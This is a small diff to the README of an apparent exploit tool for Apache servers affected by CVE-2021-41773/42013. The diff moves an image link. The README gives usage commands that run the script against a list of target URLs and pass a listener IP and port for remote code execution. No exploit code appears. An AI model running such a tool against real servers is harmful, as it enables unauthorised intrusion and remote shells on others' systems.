@@ -19,12 +19,14 @@ This tool is designed to test Apache servers for the CVE-2021-41773 / CVE-2021-4
    python3 50512.py target.txt -ip <YourIp> -p <ThePort>
    the text file should contain the url of the target
 
+![rce](png/py.jpg)
+
 Example:
 ### Remote Code Execution
 ```
 python3 50512.py target.txt -ip 10.0.2.15 -p 4444
 ```
-![rce]()
+
 
    
 ### What the Script Does ???
